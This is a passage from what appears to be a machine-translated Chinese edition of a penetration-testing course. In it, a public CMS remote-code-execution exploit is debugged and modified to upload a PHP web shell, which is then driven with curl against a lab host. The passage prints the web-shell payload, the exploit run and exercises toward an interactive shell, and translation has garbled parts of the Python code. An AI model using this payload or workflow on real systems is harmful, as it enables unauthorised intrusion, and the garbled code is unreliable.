<div style="position:absolute;top:38470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蟒蛇</font></font></font></b></nobr></div>
<div style="position:absolute;top:38504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;&gt;&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mystr = "Kali*-*Linux*-*Rocks"</font></font></font></b></nobr></div>
<div style="position:absolute;top:38521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;&gt;&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果 = mystr.split("*-*")</font></font></font></b></nobr></div>
<div style="position:absolute;top:38538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;&gt;&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果</font></font></font></b></nobr></div>
<div style="position:absolute;top:38555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">['Kali'、'Linux'、'Rocks']</font></font></nobr></div>
<div style="position:absolute;top:38572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;&gt;&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果[1]</font></font></font></b></nobr></div>
<div style="position:absolute;top:38589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'Linux'</font></font></nobr></div>
<div style="position:absolute;top:38606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;&gt;&gt; </font></font></nobr></div>
<div style="position:absolute;top:38625;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 456 - Python 字符串拆分方法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:38655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的漏洞利用代码中，字符串分隔符定义为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">csrf_param</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量（“__c”）后跟</font></font></nobr></div>
<div style="position:absolute;top:38674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等号：</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:38709;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">csrf_param = "__c"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:38726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">txt_filename = 'cmsmsrce.txt'</font></font></nobr></div>
<div style="position:absolute;top:38743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">php_filename = 'shell.php'</font></font></nobr></div>
<div style="position:absolute;top:38760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">payload = "&lt;?php system($_GET['cmd']);?&gt;"</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:38794;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">def parse_csrf_token（位置）：</font></font></b></nobr></div>
<div style="position:absolute;top:38811;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 location.split(csrf_param + "=")[1]</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:38830;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 457 - 理解第 24 行的代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:38859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了更好地理解</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IndexError</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们可以</font><font style="vertical-align: inherit;">在</font><i><font style="vertical-align: inherit;">parse_csrf_token 中</font></i><font style="vertical-align: inherit;">添加一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:38879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回指令前的函数：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:38914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">csrf_param = "__c"</font></font></nobr></div>
<div style="position:absolute;top:38930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">txt_filename = 'cmsmsrce.txt'</font></font></nobr></div>
<div style="position:absolute;top:38947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">php_filename = 'shell.php'</font></font></nobr></div>
<div style="position:absolute;top:38965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">payload = "&lt;?php system($_GET['cmd']);?&gt;"</font></font></nobr></div>
<div style="position:absolute;top:38998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">def parse_csrf_token（位置）：</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:39015;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“[+] 正在拆分的字符串：” + 位置</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:39032;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 location.split(csrf_param + "=")[1]</font></font></nobr></div>
<div style="position:absolute;top:39052;left:196"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 458 - 添加一个打印语句来查看调用 split 方法的字符串</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:39081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用现在在调用 split 方法之前显示完整字符串：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:39116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">python 44976_modified.py</font></font></font></b></nobr></div>
<div style="position:absolute;top:39133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849: InsecureRequestWarning</font></font></nobr></div>
<div style="position:absolute;top:39150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 正在发出未经验证的 HTTPS 请求。</font><font style="vertical-align: inherit;">添加证书验证是强</font></font></nobr></div>
<div style="position:absolute;top:39167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">建议。</font><font style="vertical-align: inherit;">请参阅：https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warning</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:39231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">395 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（W3Schools，2019 年），https://www.w3schools.com/python/ref_string_split.asp</font></font></font></nobr></div>
<div style="position:absolute;top:39251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">396 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Python，2019），https://docs.python.org/3/library/stdtypes.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:39379;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="34"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 34 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:39412;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:40489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:40489;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:40489;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">475</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:39508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">秒</font></font></nobr></div>
<div style="position:absolute;top:39524;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不安全请求警告）</font></font></nobr></div>
<div style="position:absolute;top:39541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 使用提供的凭据成功验证</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:39558;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 被拆分的字符串：</font></font></b></nobr></div>
<div style="position:absolute;top:39576;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://10.11.0.128/admin?_sk_=f2946ad9afceb247864</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:39592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回溯（最近一次调用最后一次）：</font></font></nobr></div>
<div style="position:absolute;top:39609;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;module&gt; 中的文件“44976_modified.py”，第 104 行</font></font></nobr></div>
<div style="position:absolute;top:39626;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跑步（）</font></font></nobr></div>
<div style="position:absolute;top:39643;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行中的文件“44976_modified.py”，第 95 行</font></font></nobr></div>
<div style="position:absolute;top:39660;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">饼干，csrf_token = 认证（）</font></font></nobr></div>
<div style="position:absolute;top:39677;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件“44976_modified.py”，第 39 行，在认证中</font></font></nobr></div>
<div style="position:absolute;top:39694;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 response.cookies, parse_csrf_token(response.headers['Location'])</font></font></nobr></div>
<div style="position:absolute;top:39711;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件“44976_modified.py”，第 25 行，在 parse_csrf_token</font></font></nobr></div>
<div style="position:absolute;top:39728;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 location.split(csrf_param + "=")[1]</font></font></nobr></div>
<div style="position:absolute;top:39745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IndexError：列表索引超出范围</font></font></nobr></div>
<div style="position:absolute;top:39764;left:137"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 459 - 检查打印输出并注意到 csrf_param 变量中定义的字符串缺失</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:39794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然漏洞利用代码期望输入字符串包含</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">__c</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">csrf_param</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量中</font><font style="vertical-align: inherit;">定义</font><font style="vertical-align: inherit;">）</font></font></nobr></div>
<div style="position:absolute;top:39813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如清单 458 所示，我们收到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 Web 应用程序的</font><i><font style="vertical-align: inherit;">_sk_</font></i><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:39846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这一点上，我们并不完全理解为什么会发生这种情况。</font><font style="vertical-align: inherit;">可能版本不匹配</font></font></nobr></div>
<div style="position:absolute;top:39865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用开发人员的软件和我们的软件之间，或者 CMS 配置不匹配。</font><font style="vertical-align: inherit;">无论哪种方式，</font></font></nobr></div>
<div style="position:absolute;top:39885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用开发从来都不是直截了当的。</font></font></nobr></div>
<div style="position:absolute;top:39917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不过，我们可以尝试将改变</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">csrf_param</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量从</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">__c</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_sk_</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了匹配</font></font></nobr></div>
<div style="position:absolute;top:39937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CMS 响应并查看漏洞利用是否有效：</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:39972;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">csrf_param = "_sk_"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:39989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">txt_filename = 'cmsmsrce.txt'</font></font></nobr></div>
<div style="position:absolute;top:40006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">php_filename = 'shell.php'</font></font></nobr></div>
<div style="position:absolute;top:40023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">payload = "&lt;?php system($_GET['cmd']);?&gt;"</font></font></nobr></div>
<div style="position:absolute;top:40042;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 460 - 更改 csrf_param 变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在让我们执行修改后的漏洞利用：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:40106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">python 44976_modified.py</font></font></font></b></nobr></div>
<div style="position:absolute;top:40123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849: InsecureRequestWarning</font></font></nobr></div>
<div style="position:absolute;top:40140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 正在发出未经验证的 HTTPS 请求。</font><font style="vertical-align: inherit;">添加证书验证是强</font></font></nobr></div>
<div style="position:absolute;top:40157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">建议。</font><font style="vertical-align: inherit;">请参阅：https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warning</font></font></nobr></div>
<div style="position:absolute;top:40174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">秒</font></font></nobr></div>
<div style="position:absolute;top:40191;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不安全请求警告）</font></font></nobr></div>
<div style="position:absolute;top:40208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 使用提供的凭据成功验证</font></font></nobr></div>
<div style="position:absolute;top:40225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 被拆分的字符串：https://10.11.0.128/admin?_sk_=bdc51a781fe6edcc126</font></font></nobr></div>
<div style="position:absolute;top:40242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 正在尝试上传 cmsmsrce.txt...</font></font></nobr></div>
<div style="position:absolute;top:40259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:40276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 已成功上传 cmsmsrce.txt</font></font></nobr></div>
<div style="position:absolute;top:40293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 正在尝试将 cmsmsrce.txt 复制到 shell.php...</font></font></nobr></div>
<div style="position:absolute;top:40310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:40327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 文件复制成功</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:40344;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 漏洞利用成功，shell可以在：https://10.11.0.128/uploads/shell.php</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:40363;left:335"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 461 - 成功的利用输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误不再显示，我们会​​看到一条消息，通知我们漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:40412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功了。</font><font style="vertical-align: inherit;">虽然我们并不清楚为什么需要更改</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">csrf_param</font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:40567;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="35"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 35 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:40600;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:41677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:41677;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:41677;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">476</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">__c</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_sk_ 的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量</font><font style="vertical-align: inherit;">，这提供了一个很好的机会来适应意外情况，</font></font></nobr></div>
<div style="position:absolute;top:40715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些伟大的渗透测试人员做得很好。</font></font></nobr></div>
<div style="position:absolute;top:40748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，我们可以通过使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">curl 之</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类的工具附加到 php shell</font><font style="vertical-align: inherit;">并提供一个</font></font></nobr></div>
<div style="position:absolute;top:40767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统命令作为有效载荷：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:40802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">curl -k https://10.11.0.128/uploads/shell.php </font></font></font><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">?cmd=whoami</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:40819;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">万维网数据</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:40839;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 462 - 通过尝试使用上传的 php shell 执行 whoami 来验证我们的漏洞利用是否成功。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好的。</font><font style="vertical-align: inherit;">漏洞利用成功。</font><font style="vertical-align: inherit;">我们有一个网络外壳。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:40902;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.2.4.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 观察运行exploit时产生的错误。</font></font></nobr></div>
<div style="position:absolute;top:40961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 尝试对代码进行故障排除并确定发生错误的原因。</font></font></nobr></div>
<div style="position:absolute;top:40989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 修改漏洞利用以避免错误并针对您的专用 Linux 客户端运行它。</font></font></nobr></div>
<div style="position:absolute;top:41017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 尝试</font><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令来</font><font style="vertical-align: inherit;">验证您的漏洞利用是否有效</font></font></nobr></div>
<div style="position:absolute;top:41037;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程php shell。</font></font></nobr></div>
<div style="position:absolute;top:41065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. 尝试使用此漏洞获取完全交互的 shell。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:41102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.3 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:41144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们介绍了需要的普通堆栈缓冲区溢出的主要部分</font></font></nobr></div>
<div style="position:absolute;top:41163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">广泛的编辑以匹配我们的目标环境。</font><font style="vertical-align: inherit;">然后我们交叉编译代码以便</font></font></nobr></div>
<div style="position:absolute;top:41183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让它在我们的 Kali 攻击平台上运行。</font></font></nobr></div>
<div style="position:absolute;top:41215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还修改了一个网络漏洞，以演示如何将这些类型的漏洞重新用于</font></font></nobr></div>
<div style="position:absolute;top:41235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不同的目标环境。</font></font></nobr></div>
<div style="position:absolute;top:41267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些场景揭示了与公众打交道时遇到的常见障碍的解决方案</font></font></nobr></div>
<div style="position:absolute;top:41287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在交战期间利用。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:41755;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="36"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 36 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:41788;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:42865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:42865;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:42865;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">477</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:41878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.3.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:41904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16. 文件传输</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:41948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">术语</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后利用</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是指攻击者一旦获得</font></font></nobr></div>
<div style="position:absolute;top:41968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对目标的某种程度的控制。</font><font style="vertical-align: inherit;">一些后利用操作包括提升权限、</font></font></nobr></div>
<div style="position:absolute;top:41987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将控制扩展到其他机器，安装后门，清理证据</font></font></nobr></div>
<div style="position:absolute;top:42007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击、上传文件和工具到目标机器等。</font></font></nobr></div>
<div style="position:absolute;top:42039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本单元中，我们将探索可以帮助我们进行评估的各种文件传输方法</font></font></nobr></div>
<div style="position:absolute;top:42059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在特定条件下正确使用时。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:42096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.1 考虑和准备</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:42138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在本模块中讨论的文件传输方法可能会危及我们的成功</font></font></nobr></div>
